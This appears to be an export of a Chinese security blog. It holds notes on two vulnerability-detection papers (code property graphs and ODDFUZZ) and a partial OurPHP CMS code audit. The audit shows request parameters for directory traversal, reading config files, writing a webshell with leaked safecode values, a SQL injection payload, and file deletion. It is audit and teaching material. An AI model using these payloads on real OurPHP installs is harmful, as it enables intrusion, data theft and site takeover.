，其中 $V_A$ 代表树结点而边 $E_A$ 对应的是树中被标记函数 $\\lambda_A$ 标记为 AST 的边。此外，我们使用 $µ_A$ 函数为每个节点分配一个属性 code，属性值就对应于节点所代表的运算符或操作数；最后，每个节点指定属性 order 以反映树的有序结构。\nB. Transforming the CFG\n我们将 CFG 表达为属性图 $G_C = (V_C,E_C,\\lambda_C,·)$，其中结点 $V_C$ 对应 AST 中的 statements 和 predicates，也就是所有带有属性 code 对应值为 $STMT$ 和 $PRED$ 的结点 $V_A$. 另外定义边标记函数 $\\lambda_C$ 来用集合 $Σ_C = \\{true, false, \\epsilon\\}$ 标记属性图中的所有边。\nC. Transforming the PDG\nPDG 可以表示为属性图 $G_P = (V_C, E_P, λ_P, µ_P)$，其中定义一个新的边集合 $E_P$ 及 边标记函数 $\\lambda_P: E_p \\to \\sum_P$ ，里面 $Σ_P = \\{C, D\\}$ 对应控制和数据依赖关系。另外，指定属性 symbol 给每一个数据依赖边来指示对应的符号；指定属性 condition 给每一个控制依赖来指定原始 predicate 的状态为 true 或 false。\nD. Combining the Representations\n构造此图所需的关键条件是，在这三个图中的每一个图中，源代码中的每个 statement 和 predicate 都存在一个节点。\nDefinition 3. 代码属性图是一个属性图 $G = (V, E, λ, µ)$ 由源代码中的 AST, CFG 和 PDG 构建而成，其中\n\n效果如下：\n\nV. Traversals For Well-Known Types Of Vulnerability\n这节要说明的是代码属性图可以有效的收集来识别不同类型的安全缺陷并形成可描述漏洞的模板。\nA. Motivational Example\n以 SSH实现中的缓冲区溢出为例，最初用的正则表达式来发现的\n\n漏洞的 statement 利用了函数 LIBSSH2 ALLOC 来为缓冲区 exit_signal 分配内存，分配内存量直接由参数变量 namelen + 1 表示。由于这个参数可控，只要指定其为32位无符号整数的最大值，求和结果将会翻转并将0传入分配函数，这将导致对缓冲区仅分配几个字节的填充。当 namelen 个字节被复制到过小缓冲区中时，则将产生缓冲区溢出漏洞。\n正则表达式的描述如下：\n\n它的缺陷在于它只能用来描述分配内存的调用中的求和部分，而它只是漏洞产生的必要条件之一。由于正则表达式无法匹配代码的嵌套结构，因此描述本身就很模糊。实际上这种方式最大的缺陷在于无法对攻击者可以控制变量 namelen 进行建模。其次，如果变量被合理的净化了，漏洞也将不存在。最后，变量的范围对于漏洞至关重要。\n因此，要想描述漏洞模式，以下方面需要涉及到：\n\n敏感操作。安全敏感操作，如调用受保护的功能、复制到缓冲区或内存分配都需要可描述\n类型使用。许多漏洞与程序中使用的数据类型紧密相关。这个信息会在 AST 中展示\n攻击者可控。分析人员必须能够表示哪些数据源处于攻击者的控制之下。为了对此进行建模，需要 PDG 所表示的数据依赖关系\n\n净化。最后，许多漏洞只有在程序没有对攻击者控制的数据进行适当的过滤时才会出现。因此，对 CFG 所表示的语句顺序进行建模至关重要\n\n\nB. Syntax-Only Vulnerability Descriptions\nAST 能描述攻击者可控的 sources、敏感操作以及 sanitizers，但是不能捕获 statements 之间的相互作用。就上图例子而言，漏洞的产生关键属性是求和直接发生在分配函数的参数中，因此带来两个挑战：\n\n判断函数是否包含求和以及调用\n捕获临近的代码结构\n\n对于第一个问题，需要遍历所有函数节点并过滤出其中所有拥有调用或求和出来的，这又会带来一个重复遍历 AST 树的问题。解决方法就是通过定义一个可重用遍历 TNODES ，其可以从 AST 的根节点遍历至所有节点。TNODES + 过滤的结果即可让我们立即判断出 AST 中是否包含目标节点。形式化表达如下：\n\n遍历以所有 $v ∈ V$ 为根的 AST 中包含的所有节点，并根据 predicate p 过滤这些节点。因此如果要定位分配函数，只需运行 MATCHp(V) 遍历所有函数节点，谓词判断是否为分配函数。\n第二个问题在于识别嵌套在调用参数内的求和，只需再前面的基础上增加一个 $ARG_f^i$ ，它是 $MATCH$ 遍历返回的调用名为 f 的函数第 i 个参数，如果 µ(v,code) = Summation 为真则 $p(v)$ 为真。\n下面是一些漏洞类型通过 $MATCH$ 遍历的描述：\n\nInsecure arguments \n对于格式化字符串漏洞产生的必要条件是传递到 printf/sprintf/fprintf 这样函数的格式化字符串非常量\n\n谓词条件是 $µ(v, code)\\neq String$\n\nInteger overflows \n形式化描述如下：\n\n谓词判断 v 是否为算数运算\n\nInteger type issues\n以整数截断为例，其产生于赋值语句右边的变量类型存储大于左边的变量类型。这里我们需要通过遍历赋值语句左右两边的子树，为此定义函数 $PAIRS_{T_1}^{T_2}$，$PAIRS$ 将执行两个独立的遍历 $T_1$ 和 $T_2$ ，将两边遍历的结果组合进一步用类似的过滤函数 $PAIRFILTER_p$ 筛选符合 predicate p 的组合\n\n$p_1$ 为真当且仅当第二个结点代表的变量类型大于第一个结点类型；$p_2$ 为真当且仅当结点为赋值语句；最后 $T_1$ 和 $T_2$ 分别遍历赋值语句的左右子树\n\n\n我们也可以通过 $AND$ 和 $OR$ 连接符来组合不同的 $MATCH$ 遍历\nDefinition 4.  纯语法漏洞描述 S 是一个2元组 $(M_0,M_1)$，其中 $M_0$ 和 $M_1$ 是 $MATCH$ 遍历的集合。如果 AST 节点与 $M_0$ 中的所有 $MATCH$ 遍历都匹配，但与$M_1$ 中的任何遍历都不匹配，则该节点与 syntax-only 描述匹配\n这种表示缺陷在于无法表达攻击者的控制或者 statements 的交互。\nC. Control-Flow Vulnerability Descriptions\n控制流边可以建模出 statement 的执行顺序。漏洞对应的是控制流图中的路径，如下即可描述出来：\n\nResouce leaks 资源释放不当\nFailure to release locks 并发锁未释放\nUse-after-free vulnerabilities 代码访问已释放的内存区域\n\n用如下定义作描述：\nDefinition 5. 基于控制流的漏洞描述用四元组来表示：$(S_{src}, Send, S_{dst}, \\{(S^i_{cnd}, t_i)\\}_{i=1…N})$ , 其中 $S_{SRC}$ 是对 source statements 的语法描述， $S_{end}$ 则为 end-statements。$S_{dst}$ 负责目的 statements，而 $\\{(S^i_{cnd},t_i)\\}_{i=1…N}$ 是一个对条件和关联输出 $t_i \\in \\{true, false\\}$ 的基于语法的描述列表。\n结点 v 匹配漏洞描述的条件如下：\n\nAST 中以 $v_{SRC}$ 为结点的子树要匹配 $S_{SRC}$\n\n存在一条路径从 $v_{SRC}$ 到 $S_{end}$ ，但中间不经过 $S_{dst}$ 节点\n\n如果对于所有 $1\\leq i \\leq N$，存在节点匹配所有描述 $S^i_{cnd}$ ，则必须将源自该节点的路径的所有边标记为 $t_i$\n\n执行一遍深度优先遍历即可作一次控制流漏洞描述匹配。缺陷在于仍无法追踪攻击者控制的数据\nD. Taint-Style Vulnerability Descriptions\n每一个 statements 节点的输入数据流边来自所有可达的赋值语句和变量的定义处，我们只需沿着这些数据流边即可遍历所有产生有用变量的 statements。特殊在于如果想要遍历从某个函数调用的参数到它对应的产生点，则需要先从临近的 statement 开始遍历。则变量的产生点可有下面的遍历计算得到：\n\n其中 N 是一系列关注点的标识符，它允许我们限制分析变量的范围。\n为了方便又设计了一个遍历 SOURCES ，它结合了敏感操作的语法描述和一些数据源来判断攻击者可控的数据被用于敏感操作。\n这里的一个问题是我们还没有考虑的 sanitizers 在里头的作用。但是如果仅添加额外的语法描述的话，则未关注到语句执行的顺序。为此我们需要结合控制流和数据流信息。\n因此我们替换 $SOURCES$ 遍历改为 $UNSANITIZED$ ，额外允许指定 symbol 且基于语法的 sanitizer 描述 $S^S_{val}$， 符号 s 用来排除所有变量被合理净化的情况。\n也就是说如果遍历能返回攻击者可控的 sources 需要满足：\n\n存在 source 到 sink 的路径且不会匹配任何 sanitizer 的描述\nsource 定义的变量如果可达 sink 点，中间不能被重定义 \n\nDefinition 6. 污点风格的漏洞描述是一个三元组 $(S_{src},S_{dst},S_{san}^s)$，$S_{src}$ 为基于语法的攻击可控的 sources 点描述，$S_{dst}$ 为安全敏感 sinks，$S_{san}^s$ 为一系列基于语法的 sanitizers 描述。结点 v 的匹配原则为如果以 v 为根的AST 包含一个以 $v_{source}$ 为根结点的子树且可以匹配 $S_{src}$，并且另一颗以 $v_{sink}$ 为结点的子树匹配 $S_{dst}$，还需满足：\n\n存在一条数据依赖路径从 $v_{source}$ 到 $v_{sink}$，也就是结点序列 $(v_0,\\dots,v_n)$ 满足 $v_0=v_{source},v_n=v_{sink},e_i=(v_i,v_{i+1})\\in E$ 且 $\\lambda(e_i)=D\\  for \\ all\\  i=0,\\dots,n-1$\n对于每一个上述数据依赖边 $e_i=(v_i,v_{i+1}),$ 从 $v_i$ 到 $v_{i+1}$ 存在控制流图中的一条路径  $(v_0,\\dots,v_m)$  对于所有 k，$0\\leq k\\leq m$，$v_k$ 都没有定义属性 $\\mu(e_i,symbol)$ 并且 $v_k$ 也不会匹配 sanitizer $S_{san}^{\\mu((v_i,v_{i+1},symbol))}$\n\n利用 Definition 6 对常见漏洞类型作形式化表达\n\nBuffer overflow \n\n通过连接上 $UNSANITIZED$ 遍历，我们便可以将漏洞遍历扩展至对于间接污点遍历的追踪\n\nCode injection\n\n\nMissing permission checks\n\n\n\nVI. Evaluation\n研究对象：Linux kernel 源代码\n步骤：\n\n调研已发现的所有漏洞，并筛选所有可以利用图遍历建模的漏洞类型\n通过构建普遍存在的漏洞图遍历，并应用在 Linux kernel 的代码属性图上进行效果评估\n\nA. Implementation\n代码属性图的构建：\n\n利用语法分析器提取源代码中每个函数的 AST\n将 ASTs 转换为 CFGs 和 PDGs，然后将这三种表示合并为代码属性图\n引入一些全局变量和结构声明结点\n基于 caller-callee 关系可视化展示\n\n遍历代码属性图依靠图数据库，这里以 Neo4J Version 1.9.5 为例\n图数据库语言选择 Gremlin 来实现图的遍历，它支持用户自定义的遍历插件，机制类似于 SQL 的存储程序\nB. Coverage Analysis\n团队首先从到2012年为止收录的所有 CVE 编号中找到了88个针对 kernel 的漏洞，并将其划分为12个常见类型，如下图所示\n\n为了评估分析表示的覆盖率，设置对照：单独 AST、AST+PDG结合、AST+CFG结合、代码属性图，分析结果如下：\n\n这里看到代码属性图无法针对 Race Conditions 以及 Design Errors 进行识别，原因在于前者依赖于运行时属性，而后者无法对程序的设计意图进行建模\nC. Discovery of Vulnerabilities\n\nBuffer overflows \n构建遍历基于漏洞原理：对攻击者可控的长度字段未作检验，细节参考 VI-D\n\nMemory disclosures \n漏洞原理是不合理的初始化结构被用户空间所占用。挖掘通过构建污点风格的遍历，从结构的本地声明处到复制到用户空间的操作，中间不经过 memset 函数。另外，还会去查看结构类型并使用基于语法的描述来判断所有结构的字段是否被赋值\n\nMemory mapping \n对于 kernels 来讲该漏洞更具针对性，需要确保用户不能将任意物理地址映射至用户空间，以避免敏感信息的泄漏以及代码执行。我们构建了基于语法的漏洞描述规则来识别，表现出来代码属性图的方法对于挖掘程序指定漏洞来言非常适配。\n\nZero-byte allocations \n与上面的案例类似，也是程序指定漏洞。源于分配函数接收了一个零字节长度字段，导致分配函数返回错误而使得 Linux Kernel 崩溃。我们这里构建的是基于污点风格的遍历。\n\n\n结果如下：\n\nD. Case Study：Buffer Overflow Identification\n从前面已知污点风格的描述可以如下：\n\nT_0\\ \\circ\\ UNSANITIZED_{T_1^S}\\ \\circ\\ T_2为此，我们只需要定义合适的遍历 $T_0$ 来定位攻击者可控的 sources，$T_1^s$ 定位 sanitizers 以及 $T_2$ 来定位安全敏感的 sinks\nsources： 指定应用，需要人工检查\n\nUser/kernel space interfaces \n可以使用多种 API 函数将数据从用户空间复制到内核空间\n\nParameters of system call handlers\n攻击者通过调用相应的系统调用，直接控制系统调用处理程序的参数\n\n\nsinks：\n\ncopy_from_user\n\nmemcpy\n均关注第三个参数，谓词表示也就是：\n$T^0_2 = ARG^3_{memcpy}$ 和 $T^1_2 = ARG^3_{copy_from_user}$\n\n\nsanitized 触发条件：\n\nDynamic allocation of the destination buffer\nRelational expressions\n\n因此用谓词定义即 $OR(V_0^S,V_1^S)$ ，其中 $V_0^S$ 匹配第一个参数包含 s 的分配函数，$V_1^S$ 匹配关系表达式和调用了包含 s 的 min 函数。最终遍历表达式即：\n\nVII. Limitations\n\n虽然实现了控制流和数据流追踪，但是并未解释代码。因此运行时行为产生的漏洞无法用代码属性图进行建模\n只能发现潜在的漏洞代码（不可判定）\n当前实现并未处理过程间程序分析\n\n相关\nM. Martin, B. Livshits, and M. S. Lam. Finding application errors and security flaws using pql: Program query language. In Proc. ofACM SIGPLAN International Conference on Object-Oriented Programming, Systems, Languages and Applications (OOPSLA), 2005\n","tags":["软件漏洞分析"]},{"title":"《ODDFUZZ Discovering Java Deserialization Vulnerabilities via Structure-Aware Directed Greybox Fuzzing》论文笔记","url":"/2023/04/25/ODDFUZZ%20Discovering%20Java%20Deserialization%20Vulnerabi%20969d466604e14480b464d5a0f649092d/","content":"ODDFUZZ: Discovering Java Deserialization Vulnerabilities via Structure-Aware Directed Greybox Fuzzing\nIntroduction\n  现有技术的存在的问题挑战：\n\n静态分析难以在精确度和召回率之间进行平衡，Java 运行时多态特性导致任意的重写方法都能用在调用链上，在分析时不可避免地盲目枚举可能的调用链就极容易遇到路径爆炸问题\n现存 fuzz 思路的无效性：\n\n注入的对象 payload 拥有多级类层次结构及其属性应该满足一定的控制流或数据流约束，fuzz 对此没有先验知识。\nfuzz 是基于覆盖指导，以代码覆盖率为指标，而不是以目标 sink 点为指向\n\n思路：\n\n\n\n执行轻量级的污点分析，识别可能的候选调用链\n对这些调用链的数据约束建模成树，并利用它来执行具有结构意识的 fuzzing\n采用 step-forward mutation strategy 和 a hybrid feedback fuzz策略\n（基于 Java fuzz 框架 JQF 实现的）\n\nBackground\n\n反序列化机制\n  序列化和反序列化的机制支持字节流的形式跨平台传输数据以及永久性存储，同时保存每一个对象所具有的属性\n  反序列化 open 的特性支持能够调用多态特性的方法，以及支持基于反射调用的行为，使得路径更加多样化\n\nPOP 链：反序列化的利用机制\n  攻击者可以去操纵数据流和控制流\n\n威胁模型：\n  假设：目标 Java 应用存在攻击者可控的反序列化入口点\n\n构建好的序列化对象会注入到这些不受信任的入口点\n目标应用会反序列化对象并自动调用攻击者可控的调用链\n注入的序列化对象当中的恶意 payload 将会流入安全敏感的调用点 sink\n防御机制一般就是黑白名单，可被绕过\n\n\n\n\n定向灰盒 fuzzing\n  为什么用基于定向的不用基于覆盖的?\n  工作流程：静态分析阶段；fuzzing loop 阶段\n\n  能使得 distance 变小的新种子将会被保留下来用于下一轮 fuzz\n\n\n\n\n\nMotivation\n  当前最先进的调用链查询工具 GadgetInspertor 只能检测出很少的可利用调用链，想要能获得更高的召回率（识别更多潜在调用链）以及精度（证实更多可利用的调用链），需要处理三个挑战：\n  A. 运行时多态问题\n  virtual 方法调用无法基于声明类型来决定具体的函数。\n  最基本的就是利用 CHA 算法直接找出所有显式和因式方法调用，然而会收到路径爆炸问题的影响；\n  现有技术：\n  GadgetInspector 可以计算从方法参数到返回值和方法调用的数据流，并根据 类继承层次结构 和 方法重写层次结构 枚举所有可用的方法；但是其未考虑运行时多态性，攻击者可控属性可以从一个受污染的参数传播到其未被跟踪的子类参数，从而产生漏报。\n  B. 结构化输入如何构建\n  构建的输入需要满足语法（生成的对象是可以序列化/反序列化的）和语义（生成的序列化对象符合调用链的控制流和数据流约束）的要求\n  现有技术：基于生成的 fuzzing。\n  SerHybrid 通过执行指针分析生成堆访问路径（符合数据流约束，可以知道流经到 sink 点的变量所指向的对象堆访问路径），为未出现在堆路径中的字段属性分配随机值，以根据它们的类型生成有效的注入对象以供执行，根据它们的类型生成有效的注入对象以供执行。\n\n  缺陷在于控制流约束的实现并不高效，字段属性被分配随机值，很难去给这些受到控制流约束的字段赋予恰当的值（对象）\n  C. 以目标为导向的 fuzzing\n  代码覆盖率的变化并不能使得更近 sink 点，因为控制流稍微变化，都可以改变代码的覆盖率，但是可能会离 sink 点越来越远\n\n  现有技术：基于目标 fuzzing，\n  DGF 优先调度能使得执行路径更靠近目标点的种子\n  更靠近怎么测量？利用种子执行路径上所有基本块的距离的算术平均值\n  缺陷：这样的种子距离可能存在偏差，可能并不完全对应于预期执行的gadget 链的执行路径，因为并不是每个块都会驱动种子对象执行到在已确定的链中期望的目标 sink。此外，不同种子对象的执行跟踪可能会有很大差异，并且只能在运行时得知，因为对种子对象属性的修改可能会激活多个gadget的执行。因此，期望能得到一种能有效评估生成注入对象质量的基于目标的 fuzz 反馈机制\n\nODDFuzz 设计\n  A. 整体\n  两部分模块组成：\n\nIdentifier 模块，利用待测试程序的编译文件作为输入实行轻量级的污点分析，自动化枚举所有潜在的调用链\nValidator 模块，基于识别出的潜在调用链构建语法上有效的注入对象作为种子来 fuzz; fuzz loop 结合前向突变策略和混合的反馈机制（种子距离 + 调用链覆盖率）指导突变注入对象朝预期的 sink 点移动；当生成的注入对象到达 sink 点时，就报告产生了可利用的调用链\n\nB.污点分析部分\n构建可利用 gadget 的前提：攻击可控的污点对象是否能从入口点 source 传播到 sink 函数。\n如果可利用的 gadget 存在，那么一定存在这样一条调用路径。\n提出：轻量级基于摘要的污点分析\n第一步，生成方法摘要信息\n\n\n\n抽离出所有 classpath 上方法的参数和 this 变量作为摘要\n追踪每个方法中变量之间的信息流传播，主要关注：\n\n赋值\nload x = o.f\nstore o.f = x\nCall\n与参数有数据依赖关系的变量也会加入到方法的摘要当中\n\n\n\n\n\n\n**第二步，调用链识别**\n\n1. 指定可利用 magic（source 16) 方法和安全敏感调用点（sink 30） 列表\n\n    ![Untitled](ODDFUZZ%20Discovering%20Java%20Deserialization%20Vulnerabi%20969d466604e14480b464d5a0f649092d/Untitled%205.png)\n\n2. 基于之前计算得到的方法摘要信息，识别怀疑的 gadget\n\n    一旦遇到一个 magic method 在 PUT 的 classpath 当中，就从这点开始执行深度遍历DFS，基于摘要信息来串联可利用的 gadgets\n\n    为了避免死循环，设置候选调用链的最大长度作为阈值。\n\n    如何处理多态特性？当遇到 call 函数的 caller 是被污点标记的对象时，就执行 CHA。其余和普通的基于调用图的污点分析一致\n\n    知道遇到 sink 函数，或者调用链遇到阈值就停止。\n\n\nC. 结构感知的定向灰盒模糊 fuzzing\n\n![Untitled](ODDFUZZ%20Discovering%20Java%20Deserialization%20Vulnerabi%20969d466604e14480b464d5a0f649092d/Untitled%206.png)\n\n- 结构化的种子生产\n\n    必要条件：\n\n    1. 设计嵌套对象层次结构，以反映给定 gadget 链的执行流程\n    2. 赋予多级子对象恰当的属性值以便使其能到达 sink 点\n\n    挑战：精心设计复杂对象结构的属性布局需求对于传统的 fuzzing 方案十分吃力\n\n    解决方案：采用分层的数据结构 **属性树，其中根结点代表具有1个或多个gadget 的类对象**\n\n    构建模块：`input generator`\n\n    具体步骤：\n\n    1. 初始化每个 gadget 中涉及到的类，利用反射获取所有的成员属性以构建属性树。\n    2. 如果其中一个属性是另一个属性树根节点代表的对象或者继承的对象，并且该对象为 gadget 链中的下一节点，那么我们就合并两棵树。\n    3. 类似地，如果其中一个属性是个接口类，而另一棵树的根节点是其实现，那么也将其进行合并\n    4. 直至不再有分离但是有关联的属性树存在，迭代结束\n\n    ![Untitled](ODDFUZZ%20Discovering%20Java%20Deserialization%20Vulnerabi%20969d466604e14480b464d5a0f649092d/Untitled%207.png)\n\n    接着，fuzzer 就会遍历属性树将其初始化为注入对象，对于对于没有后继的节点就直接设置为 `null`\n\n- 具有导向性的种子选择\n\n    由于注入对象的调用路径动态时决定，导致整个突变策略是 sink-unawareness。如果没有清晰的反馈信息来指导将会陷入语义的盲目性，降低 fuzzer 的性能。\n","tags":["软件漏洞分析"]},{"title":"跟着Y4师傅学代码审计-OurPHP","url":"/2022/12/06/OurPHP%E5%88%86%E6%9E%90/","content":"写在前面这是代码审计的第四篇OurPHP，最近实验作业ddl好多，整的心里边烦躁，静下心来看看代码\n\n漏洞分析目录遍历漏洞\n还是从后台模板开始看，随便点击一个模板看看url /client/manage/ourphp_filebox.php?path=user/css&amp;dir\n我们可以定位到对应的执行文件函数处\n首先针对path变量\nif(empty($_SESSION[&#x27;ourphp_out&#x27;]))    &#123;        $file = listDirFiles(&#x27;../../templates/&#x27;.$_GET[&#x27;path&#x27;]);        $file2 = &#x27;../../templates/&#x27;.$_GET[&#x27;path&#x27;];    &#125;else&#123;        $file = listDirFiles(&#x27;../../&#x27;.$_GET[&#x27;path&#x27;]);        $file2 = &#x27;../../&#x27;.$_GET[&#x27;path&#x27;];      &#125;\n跟进listDirFiles函数，可以看到是一个常规的递归读取目录下的文件并返回所有的文件名集合。而前面并未对path变量作任何限制，所以存在目录遍历，然后看怎么回显至页面\nfunction listDirFiles($dir)&#123;    $arr = array();    if (is_dir($dir)) &#123;//如果是目录，则进行下一步操作        $d = opendir($dir);//打开目录        if ($d) &#123;//目录打开正常            while (($file = readdir($d)) !== false) &#123;//循环读出目录下的文件，直到读不到为止                if  ($file != &#x27;.&#x27; &amp;&amp; $file != &#x27;..&#x27;) &#123;//排除一个点和两个点                    if (is_dir($file)) &#123;//如果当前是目录                        $arr[$file] = listDirFiles($file);//进一步获取该目录里的文件                    &#125; else &#123;                        $arr[] = $file;//记录文件名                    &#125;                &#125;            &#125;        &#125;        closedir($d);//关闭句柄    &#125;    return $arr;&#125;\n这里就用到了dir的作用，也就是如果存在dir传参，就会根据不同的文件形式，包括.和..都作成列表展示在页面上\n\n那就很简单了，直接读一下配置文件对应目录（之前设置了一个口令）\npath=../config/&amp;dir\n\n任意文件读取和上面类似，我们随便点一个文件看看传参\n/client/manage/ourphp_filebox.php?path=../../templates/user/css/style.css&amp;edit，很简单直接保证带着这两个参数，就能回显处任意文件内容\n\npath=../../config/ourphp_config.php&amp;edit\n\n任意文件写入接着模板的思路来，随便点一个模板进行编辑然后保存，url为/client/manage/ourphp_filebox.php?path=edit&amp;ok，POST传参code和md\n定位到对应代码处，可以看到这里首先会对code的内容以及md进行检验md2为safecode\n&#x27;safecode&#x27; =&gt; &#x27;uYeFBbFvWkT9i7FzcrCjknBKIBtXIMR4FvWkT9&#x27;,\t// 安全校验码\n这块对md的检验还是很死的，但是我们可以配合前面的任意文件读方法来获取到。我们往下看。$_SESSION[&#39;ourphp_out&#39;]这个Session不为空的话，我们实际上是可以写马的，因为基本没有对code作过滤。因此只要在md[0]处写好文件名就行\nif(isset($_GET[&#x27;ok&#x27;]))    &#123;        if(empty($_POST[&#x27;code&#x27;]) || empty($_POST[&#x27;md&#x27;]))&#123;           $list = &#x27;&lt;h1 style=&quot;float:left; margin-top:30px; padding-bottom:30px; font-size:20px; width:100%; text-align:center;&quot;&gt;不能为空呀！&lt;/h1&gt;&#x27;;        &#125;        $md = explode(&quot;|&quot;, $_POST[&#x27;md&#x27;]);        $md2 = MD5($md[0].$ourphp[&#x27;safecode&#x27;]);        if($md[1] != $md2)&#123;            $list = &#x27;&lt;h1 style=&quot;float:left; margin-top:30px; padding-bottom:30px; font-size:20px; width:100%; text-align:center;&quot;&gt;验证不通过呀！&lt;/h1&gt;&#x27;;        &#125;        $code = $_POST[&#x27;code&#x27;];\t\tif(get_magic_quotes_gpc())\t\t&#123;\t\t\t$code = stripslashes($code);\t\t&#125;        $code = str_replace(&quot;&lt;ourphp_&quot;, &quot;&lt;textarea&quot;, $code);        $code = str_replace(&quot;&lt;/ourphp_&gt;&quot;, &quot;&lt;/textarea&gt;&quot;, $code);        if(empty($_SESSION[&#x27;ourphp_out&#x27;]))        &#123;                                    if(stristr($code,&quot;&lt;?php&quot;) || stristr($code,&quot;&lt;%&quot;) || stristr($code,&quot;language=\\&quot;php\\&quot;&quot;) || stristr($code,&quot;language=&#x27;php&#x27;&quot;) || stristr($code,&quot;language=php&quot;) || stristr($code,&quot;&lt;?=&quot;) || stristr($md[0],&quot;.php&quot;) || stristr($md[0],&quot;.asp&quot;) || stristr($md[0],&quot;.aspx&quot;) || stristr($md[0],&quot;.jsp&quot;) || stristr($md[0],&quot;.htaccess&quot;) || stristr($md[0],&quot;.ini&quot;) || stristr($md[0],&quot;.user.ini&quot;))            &#123;                $list = &#x27;&lt;h1 style=&quot;float:left; margin-top:30px; padding-bottom:30px; font-size:20px; width:100%; text-align:center;&quot;&gt;不要提交违法代码！&lt;/h1&gt;&#x27;;            &#125;else&#123;                $filego = fopen($md[0],&#x27;w&#x27;);                fwrite($filego,$code);                fclose($filego);                $list = &#x27;&lt;h1 style=&quot;float:left; margin-top:30px; padding-bottom:30px; font-size:20px; width:100%; text-align:center;&quot;&gt;编辑成功！&lt;/h1&gt;&#x27;;            &#125;        &#125;else&#123;            if(stristr($md[0],&quot;.asp&quot;) || stristr($md[0],&quot;.aspx&quot;) || stristr($md[0],&quot;.jsp&quot;) || stristr($md[0],&quot;.htaccess&quot;) || stristr($md[0],&quot;.ini&quot;) || stristr($md[0],&quot;.user.ini&quot;))            &#123;                $list = &#x27;&lt;h1 style=&quot;float:left; margin-top:30px; padding-bottom:30px; font-size:20px; width:100%; text-align:center;&quot;&gt;不要提交违法代码！&lt;/h1&gt;&#x27;;            &#125;else&#123;                $filego = fopen($md[0],&#x27;w&#x27;);                fwrite($filego,$code);                fclose($filego);                $list = &#x27;&lt;h1 style=&quot;float:left; margin-top:30px; padding-bottom:30px; font-size:20px; width:100%; text-align:center;&quot;&gt;编辑成功！&lt;/h1&gt;&#x27;;            &#125;        &#125;    &#125;\n这里再来探究一下$_SESSION[&#39;ourphp_out&#39;]是咋得到的，全局搜索可定位到\n\n跟入pw方法，参数均可控。这里我们可以看到这个字段不为空的条件就是两个检验值符合条件，同样配合任意文件读取可得到\nfunction pw($a,$b)&#123;    global $db,$ourphp;    session_start();    if ($a == $ourphp[&#x27;validation&#x27;] &amp;&amp; $b == $ourphp[&#x27;safecode&#x27;])&#123;                 $_SESSION[&#x27;ourphp_out&#x27;] = &quot;ourphp&quot;;            &#125;else&#123;        if(empty($_SESSION[&#x27;ourphp_out&#x27;]))        &#123;            include &#x27;ourphp_checkadmin.php&#x27;;        &#125;else&#123;            session_start();        &#125;    &#125;&#125;\nvalidation=831266&amp;safecode=uYeFBbFvWkT9i7FzcrCjknBKIBtXIMR4FvWkT9\n因此我们就可以在根目录写一个马\npath=edit&amp;ok&amp;validation=831266&amp;code=uYeFBbFvWkT9i7FzcrCjknBKIBtXIMR4FvWkT9 \n\n\nSQL注入广告管理处，随便点一个进行编辑，保存。路由信息为/client/manage/ourphp_adview.php?ourphp_cms=edit&amp;id=1\nelseif ($_GET[&quot;ourphp_cms&quot;] == &quot;edit&quot;)&#123;\tif (!empty($_POST[&quot;OP_Adclass&quot;]))&#123;\t\t$OP_Adclass = implode(&#x27;,&#x27;,$_POST[&quot;OP_Adclass&quot;]);\t&#125;else&#123;\t\t$OP_Adclass = &#x27;&#x27;;\t&#125;\t$query = $db -&gt; update(&quot;`ourphp_ad`&quot;,&quot;`OP_Adcontent` = &#x27;&quot;.admin_sql($_POST[&quot;OP_Adcontent&quot;]).&quot;&#x27;,`OP_Adclass` = &#x27;&quot;.$OP_Adclass.&quot;&#x27;,`time` = &#x27;&quot;.date(&quot;Y-m-d H:i:s&quot;).&quot;&#x27;&quot;,&quot;where id = &quot;.intval($_GET[&#x27;id&#x27;]));\t$ourphp_font = 1;\t$ourphp_class = &#x27;ourphp_ad.php?id=ourphp&#x27;;\trequire &#x27;ourphp_remind.php&#x27;;\t\t\t&#125;\n这里可以看到如果传递了get参数outphp_cms为edit值，就会存在一个update语句，其中id因为会被转为整数我们没啥可利用的，关注POST传参OP_Adcontent值上，先跟入admin_sql方法。\n这里可以看到里面就是简单的替换单引号\n\n以及OP_Adclass值更是没任何过滤，并且是由POST传参过来（传递一个数组）\n首先就是我们可以回显出任意想要的数据\nOP_Adclass[]=&#x27;, OP_Adclass=version() #\n\n任意文件删除1该网站还有一个数据库备份的功能，关注路由/client/manage/ourphp_bakgo.php\nsink点如下，会对dfile里面的参数值进行删除，同时要满足filedeled值为1\n\n我们往前看有无干扰执行到这里的语句\n\n对dir参数有一个验证操作\n\n实际上底下会去对目录中的文件进行计数($dfileNo)，如果不为0的话将会干扰到后面的文件删除操作，但是注意到我们可以控制filedeled值，使得不进入循环。当然也可以dir随便传一个让其创建一个空目录，其中自然也就没有文件计数。\n//是否有多余的文件$dfileNo=0;$open=opendir($_POST[&quot;dir&quot;]);$delhtml=&quot;&quot;;while($afilename=readdir($open) and !$_POST[filedeled])&#123;\t$checked=&quot;&quot;;\tif(substr($afilename,0,strlen($_POST[filename]))==$_POST[filename])&#123;\t\t$checked=&quot;checked&quot;;\t&#125;\tif(is_file(&quot;$_POST[dir]/$afilename&quot;))&#123;\t\t$delhtml.=tabledata(&quot;$afilename|&quot;.date(&quot;Y-m-d&quot;,filectime(&quot;$_POST[dir]/$afilename&quot;)).&quot;|&quot;.num_bitunit(filesize(&quot;$_POST[dir]/$afilename&quot;)).&quot;|&lt;center&gt;&lt;input name=&#x27;dfile[$dfileNo]&#x27; type=&#x27;checkbox&#x27; value=&#x27;$_POST[dir]/$afilename&#x27; $checked&gt;&lt;/center&gt;&quot;);\t\t$dfileNo++;\t&#125;&#125;   //多余文件处理if($dfileNo)&#123;\t$_POST[filedeled]=1;\tfheader();\techo tabletext(&quot;&#x27;$_POST[dir]/&#x27;中以下文件已存在，它们可能被覆盖或成为额外的文件。&lt;br&gt;您可以有选择地删除它们或返回上一步重新设定：&quot;,&quot;98%&quot;);\techo tablestart(&quot;选择要删除的文件：&quot;,&quot;100%&quot;);\techo tabledata(&quot;&lt;strong&gt;文件名&lt;/strong&gt;|&lt;strong&gt;修改日期&lt;/strong&gt;|&lt;strong&gt;大小&lt;/strong&gt;|&lt;center&gt;&lt;strong&gt;反选&lt;/strong&gt;&lt;input type=&#x27;checkbox&#x27; name=&#x27;checkbox&#x27; value=&#x27;&#x27; onclick=&#x27;selrev();&#x27;&gt;&lt;/center&gt;&quot;,&quot;31%|32%|21%|16%&quot;);\techo $delhtml;\techo tableend();\techo &quot;\t&lt;script language=&#x27;JavaScript&#x27;&gt;\tfunction selrev() &#123;\t\twith(myform) 